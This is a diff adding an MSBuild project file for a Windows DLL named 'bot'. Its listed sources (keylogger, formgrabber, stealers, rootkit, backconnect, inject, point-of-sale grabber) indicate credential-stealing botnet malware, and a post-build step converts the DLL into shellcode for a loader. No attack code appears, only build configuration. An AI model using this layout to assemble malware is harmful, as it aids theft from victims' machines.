@@ -1,0 +1,176 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{9BB14BCF-331B-4C28-85D5-455ABC6FFC7D}</ProjectGuid>
+    <RootNamespace>bot</RootNamespace>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <PlatformToolset>v142</PlatformToolset>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <CharacterSet>MultiByte</CharacterSet>
+    <PlatformToolset>v142</PlatformToolset>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="PropertySheets">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup>
+    <_ProjectFileVersion>10.0.30319.1</_ProjectFileVersion>
+    <OutDir Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">$(SolutionDir)$(Configuration)\</OutDir>
+    <IntDir Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">$(Configuration)\</IntDir>
+    <GenerateManifest Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">false</GenerateManifest>
+    <OutDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">$(SolutionDir)$(Configuration)\</OutDir>
+    <IntDir Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">$(Configuration)\</IntDir>
+    <GenerateManifest Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">false</GenerateManifest>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>DEBUG;WIN32_LEAN_AND_MEAN;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <MinimalRebuild>true</MinimalRebuild>
+      <BasicRuntimeChecks>EnableFastChecks</BasicRuntimeChecks>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <WarningLevel>Level3</WarningLevel>
+      <DebugInformationFormat>EditAndContinue</DebugInformationFormat>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>ws2_32.lib;Crypt32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <OutputFile>$(OutDir)$(ProjectName).dll</OutputFile>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <EntryPointSymbol>
+      </EntryPointSymbol>
+      <TargetMachine>MachineX86</TargetMachine>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <Optimization>Disabled</Optimization>
+      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
+      <IntrinsicFunctions>false</IntrinsicFunctions>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <PreprocessorDefinitions>WIN32_LEAN_AND_MEAN;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <WarningLevel>Level3</WarningLevel>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <CompileAs>CompileAsC</CompileAs>
+    </ClCompile>
+    <Link>
+      <AdditionalDependencies>ws2_32.lib;crypt32.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+      <OptimizeReferences>true</OptimizeReferences>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <EntryPointSymbol>DllMain</EntryPointSymbol>
+      <TargetMachine>MachineX86</TargetMachine>
+    </Link>
+    <PostBuildEvent>
+      <Command>..\bot\Release\dllCrypt.exe ..\bot\Release\bot.dll ..\loader\bot_shellcode_x86.h</Command>
+    </PostBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="bot.c" />
+    <ClCompile Include="botkiller.c" />
+    <ClCompile Include="botThreads.c" />
+    <ClCompile Include="common.c" />
+    <ClCompile Include="connection.c" />
+    <ClCompile Include="debug.c" />
+    <ClCompile Include="dynamicconfig.c" />
+    <ClCompile Include="inject.c" />
+    <ClCompile Include="install.c" />
+    <ClCompile Include="ipc.c" />
+    <ClCompile Include="ipc_tasks.c" />
+    <ClCompile Include="main.c" />
+    <ClCompile Include="os_info.c" />
+    <ClCompile Include="pipes.c" />
+    <ClCompile Include="stealers.c" />
+    <ClCompile Include="tasks.c" />
+    <ClCompile Include="zombie.c" />
+    <ClCompile Include="backconnect.c" />
+    <ClCompile Include="protocol.c" />
+    <ClCompile Include="file_persistence.c" />
+    <ClCompile Include="hook_manager.c" />
+    <ClCompile Include="hook_persistence.c" />
+    <ClCompile Include="rootkit.c" />
+    <ClCompile Include="unhooker.c" />
+    <ClCompile Include="userhooks.c" />
+    <ClCompile Include="dns_redirect.c" />
+    <ClCompile Include="chromehooks.c" />
+    <ClCompile Include="formgrabber.c" />
+    <ClCompile Include="httpgrabber.c" />
+    <ClCompile Include="nss3.c" />
+    <ClCompile Include="wininet.c" />
+    <ClCompile Include="pos_grabber.c" />
+    <ClCompile Include="keylogger.c" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="sqlite3.def" />
+    <None Include="sqlite3.dll" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="bot.h" />
+    <ClInclude Include="botkiller.h" />
+    <ClInclude Include="botThreads.h" />
+    <ClInclude Include="connection.h" />
+    <ClInclude Include="debug.h" />
+    <ClInclude Include="dynamicconfig.h" />
+    <ClInclude Include="inject.h" />
+    <ClInclude Include="install.h" />
+    <ClInclude Include="ipc.h" />
+    <ClInclude Include="ipc_tasks.h" />
+    <ClInclude Include="modules.h" />
+    <ClInclude Include="os_info.h" />
+    <ClInclude Include="pipes.h" />
+    <ClInclude Include="stealers.h" />
+    <ClInclude Include="tasks.h" />
+    <ClInclude Include="zlib\zconf.h" />
+    <ClInclude Include="zlib\zlib.h" />
+    <ClInclude Include="zombie.h" />
+    <ClInclude Include="backconnect.h" />
+    <ClInclude Include="protocol.h" />
+    <ClInclude Include="file_persistence.h" />
+    <ClInclude Include="hook_manager.h" />
+    <ClInclude Include="hook_persistence.h" />
+    <ClInclude Include="rootkit.h" />
+    <ClInclude Include="unhooker.h" />
+    <ClInclude Include="userhooks.h" />
+    <ClInclude Include="dns_redirect.h" />
+    <ClInclude Include="chromehooks.h" />
+    <ClInclude Include="formgrabber.h" />
+    <ClInclude Include="httpgrabber.h" />
+    <ClInclude Include="nss3.h" />
+    <ClInclude Include="wininet.h" />
+    <ClInclude Include="pos_grabber.h" />
+    <ClInclude Include="keylogger.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="zlib\zlib.lib" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
